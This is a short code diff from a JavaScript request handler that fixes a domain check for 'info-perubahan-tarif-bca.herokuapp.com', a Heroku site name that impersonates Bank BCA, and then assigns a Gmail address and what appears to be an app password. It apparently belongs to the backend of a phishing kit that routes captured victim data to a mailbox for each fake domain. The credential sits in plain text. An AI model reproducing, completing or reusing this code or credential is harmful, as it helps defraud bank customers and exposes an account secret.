@@ -7,7 +7,7 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
-    if (url == 'info-perubahan-tarif-bcaherokuapp.com'){
+    if (url == 'info-perubahan-tarif-bca.herokuapp.com'){
 
        email = 'bankbca335@gmail.com'
        pass = 'xvyagwkszjovilau'
